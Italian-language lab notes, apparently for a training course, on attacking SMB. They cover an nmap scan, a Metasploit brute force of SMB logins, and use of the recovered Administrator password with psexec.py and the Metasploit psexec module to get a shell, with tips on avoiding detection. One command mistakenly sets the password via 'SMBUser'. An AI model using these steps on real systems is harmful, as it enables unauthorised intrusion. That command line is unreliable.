# Exploiting SMB With PsExec

<figure><img src="../../.gitbook/assets/image (755).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (756).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (758).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (759).png" alt=""><figcaption></figcaption></figure>

## Identificare le porte e servizi aperti con nmap

```
nmap -sV -sC 10.2.24.221
nmap -p445 --script smb-protocols demo.ine.local //run nmap script to list the supported protocols and dialects of a SMB server
```

<figure><img src="../../.gitbook/assets/image (760).png" alt=""><figcaption></figcaption></figure>

La porta 445 è aperta e quindi il servizio SMB è attivo, inoltre lo script ci dice che viene usato smb version 2 e message signing is enabled but not required, il che significa che possiamo autenticarci via PsExec

<figure><img src="../../.gitbook/assets/image (769).png" alt=""><figcaption></figcaption></figure>

## SMB bruteforce con modulo MSF

```
service postgresql start && msfconsole
search smb_login
use auxiliary/scanner/smb/smb_login
show options
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS 10.2.24.221
set VERBOSE false //così mostra solo le credenziali che avranno successo invece di tutte
run
```

<figure><img src="../../.gitbook/assets/image (761).png" alt=""><figcaption></figcaption></figure>

è possibile specificare SMBDomain se il target fa parte di un dominio ed è importante, e anche SMBUser e SMBPassword se abbiamo le credenziali per l'autenticazione.

<figure><img src="../../.gitbook/assets/image (762).png" alt=""><figcaption></figcaption></figure>

e abbiamo trovato la password di Administrator in questo caso.

## Utilizzare le credenziali per autenticarci via PsExec

PsExec è un programma Windows quindi su Linux non possiamo usarlo a meno che non utilizziamo Wine, però ci viene in soccorso un programma python che essenzialmente è una implementazione di PsExec in Python: psexec.py

```
psexec.py Administrator@10.2.24.221 cmd.exe
//e ci chiede la password che in questo caso è qwertyuiop
```

<figure><img src="../../.gitbook/assets/image (764).png" alt=""><figcaption></figcaption></figure>

La parte bella è che **non stiamo usando tool o exploit sul target e nemmeno stiamo uploadando qualche file o malware sul target quindi è più difficile da individuare**, stiamo usando funzioni legittime con utenti legittimi.

### Ottenere una meterpreter  session con modulo MSF

```
search psexec
use exploit/windows/smb/psexec
show options
set RHOSTS 10.2.24.221
set SMBUser Administrator
set SMBUser qwertyuiop
exploit
```

<figure><img src="../../.gitbook/assets/image (765).png" alt=""><figcaption></figcaption></figure>

**NB: Però in questo caso viene caricato un file (payload) sul target quindi potrebbe essere individuato, per il resto stiamo sempre usando credenziali legittime.**

<figure><img src="../../.gitbook/assets/image (766).png" alt=""><figcaption></figcaption></figure>

Il payload di default è sempre quello per Windows 32bit (ma va bene anche per 64bit)

<figure><img src="../../.gitbook/assets/image (767).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (768).png" alt=""><figcaption></figcaption></figure>
